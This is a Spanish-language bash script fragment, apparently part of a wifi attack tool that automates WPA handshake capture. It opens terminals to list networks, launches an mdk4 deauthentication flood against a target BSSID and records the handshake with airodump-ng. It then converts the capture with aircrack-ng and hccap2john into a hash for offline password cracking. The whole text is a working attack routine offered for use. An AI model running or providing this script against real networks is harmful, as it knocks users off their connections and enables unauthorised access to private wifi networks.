...
echo
echo
 gnome-terminal --geometry 100x24+1300+20 -- bash -c "sudo nmcli dev wifi list && sleep 999999999" &
...
if [ -d requisitos/resultados/$bssid/handshake ]
	then
		 rm -r requisitos/resultados/$bssid/handshake
fi
if [ -d requisitos/resultados/Hash* ]
	then
		 rm -r requisitos/resultados/Hash*
fi
...
clear
 gnome-terminal --geometry 82x24+1300+20 -- bash requisitos/5.2.sh &
 gnome-terminal --geometry 82x24+1300+1000 -- bash -c "echo -e '\033[0;35m[#] 10 Segundos para empezar el Ataque:\033[0m' && sleep 10 && sudo timeout 30s mdk4 $interfaz2 d -B $bssid -c $ch; echo -e '\033[0m'" &
 airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg -w $bssid
Title
echo "[#] Ultimos ajustes y Resultado"
 pkill gnome-terminal >/dev/null
 rm -r $bssid-01.csv
 rm -r $bssid-01.log.csv
 rm -r $bssid-01.kismet.csv
 rm -r $bssid-01.kismet.netxml
...
echo "------------------------------------------------------------"
echo
 aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'FNR>= 5{print}' | awk 'FNR<= 3{print}'
 aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'FNR>= 20{print}'
 hccap2john requisitos/resultados/$bssid/handshake/$bssid-02.hccap > requisitos/resultados/$bssid/Hash.$bssid-03
